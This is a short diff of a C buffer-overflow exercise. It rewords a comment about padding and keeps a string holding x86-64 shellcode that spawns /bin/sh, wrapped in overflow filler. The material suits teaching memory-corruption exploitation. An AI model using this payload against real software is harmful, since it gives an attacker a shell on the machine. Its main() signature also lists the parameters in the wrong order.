@@ -8,7 +8,8 @@ int main(char* argv[], int argc) {
         // char rand_str[32];
         // gets(rand_str);
 
-        //our malicious input will look something like this, containing 27 bad chars, so we need 5 padding chars minus one for the null terminator.
+        //our malicious input will look something like this, containing 21 bad chars, so we need padding chars for the amount of memory between 
+        //rsp and rbp  minus one for the null terminator.
         char rand_str[] = "aaaaaaaa"
                           "\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
                           "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
